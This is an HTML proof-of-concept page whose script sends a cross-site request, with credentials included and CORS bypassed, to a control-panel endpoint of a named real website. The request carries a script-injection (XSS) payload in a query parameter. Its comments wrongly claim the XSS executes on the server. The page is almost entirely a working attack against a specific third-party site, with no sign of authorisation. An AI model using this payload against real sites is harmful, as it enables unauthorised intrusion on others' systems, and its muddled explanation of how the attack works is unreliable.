<body>
<h2>XSS PoC - Check browser console for errors</h2>

<script>
// This will make the request and trigger the XSS on THEIR server
// Even though we can't read the response, the XSS executes on their side
fetch('https://www.preloved.co.uk/controlpanel/testemail?p8t7i8=1--><script>alert(document.domain)</script>', {
    method: 'GET',
    headers: {
        'X-Middleton': '1123asd213'
    },
    mode: 'no-cors',  // Bypass CORS check
    credentials: 'include'
}).then(() => {
    document.getElementById('result').innerHTML = "Request sent - XSS should trigger on their server";
}).catch(err => {
    document.getElementById('result').innerHTML = "Error: " + err;
});
</script>

<div id="result"></div>
</body>
